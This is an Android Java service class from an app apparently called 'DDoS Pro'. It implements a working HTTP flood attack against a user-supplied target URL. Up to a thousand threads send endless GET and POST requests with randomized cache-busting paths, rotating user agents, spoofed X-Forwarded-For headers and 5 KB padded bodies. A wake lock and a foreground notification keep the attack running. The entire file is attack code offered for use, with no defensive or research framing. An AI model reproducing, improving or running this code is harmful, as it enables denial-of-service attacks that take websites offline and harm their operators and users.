package com.mzkyzak.ddospro;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import androidx.core.app.NotificationCompat;
import okhttp3.*;
import java.io.IOException;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class AttackService extends Service {
    public static volatile int packetCount = 0;
    public static volatile int packetPerSecond = 0;
    private volatile boolean isRunning = true;
    private String target;
    private Handler handler = new Handler(Looper.getMainLooper());
    private OkHttpClient client;
    private ExecutorService threadPool;
    private PowerManager.WakeLock wakeLock;

    private final String[] USER_AGENTS = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
            "Googlebot/2.1 (+http://www.google.com/bot.html)"
    };

    @Override
    public void onCreate() {
        super.onCreate();
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DDoSPro:WakeLock");
        wakeLock.acquire(10 * 60 * 1000L);
        threadPool = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors() * 8);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_STICKY;
        target = intent.getStringExtra("target");
        int threads = intent.getIntExtra("threads", 1000);
        int duration = intent.getIntExtra("duration", 300);

        client = new OkHttpClient.Builder()
                .connectionPool(new ConnectionPool(300, 5, TimeUnit.MINUTES))
                .connectTimeout(50, TimeUnit.MILLISECONDS)
                .readTimeout(50, TimeUnit.MILLISECONDS)
                .writeTimeout(50, TimeUnit.MILLISECONDS)
                .retryOnConnectionFailure(true)
                .build();

        packetCount = 0;
        packetPerSecond = 0;
        showNotification();

        Random random = new Random();

        for (int i = 0; i < threads; i++) {
            threadPool.execute(() -> {
                while (isRunning) {
                    try {
                        String url = target + "/" + UUID.randomUUID() + "?t=" + System.currentTimeMillis();
                        Request.Builder builder = new Request.Builder()
                                .url(url)
                                .header("User-Agent", USER_AGENTS[random.nextInt(USER_AGENTS.length)])
                                .header("Cache-Control", "no-cache")
                                .header("X-Forwarded-For", Utils.generateRandomIP());

                        if (random.nextBoolean()) {
                            builder.post(RequestBody.create(
                                    MediaType.parse("text/plain"),
                                    "x=" + "A".repeat(1024 * 5)
                            ));
                        } else {
                            builder.get();
                        }

                        client.newCall(builder.build()).enqueue(new Callback() {
                            @Override public void onFailure(Call call, IOException e) { packetCount++; }
                            @Override public void onResponse(Call call, Response response) throws IOException {
                                response.close();
                                packetCount++;
                            }
                        });
                    } catch (Exception ignored) {}
                }
            });
        }

        handler.postDelayed(new Runnable() {
            private int lastCount = 0;
            @Override
            public void run() {
                if (!isRunning) return;
                int current = packetCount;
                packetPerSecond = current - lastCount;
                lastCount = current;
                handler.postDelayed(this, 1000);
            }
        }, 1000);

        if (duration > 0) {
            handler.postDelayed(() -> {
                isRunning = false;
                stopSelf();
            }, duration * 1000L);
        }

        return START_STICKY;
    }

    private void showNotification() {
        String channelId = "ddos_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    channelId,
                    "DDoS Attack",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }

        Notification notification = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("🔥 DDoS Pro")
                .setContentText("Target: " + target)
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(1, notification);
        }
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        if (threadPool != null) threadPool.shutdownNow();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}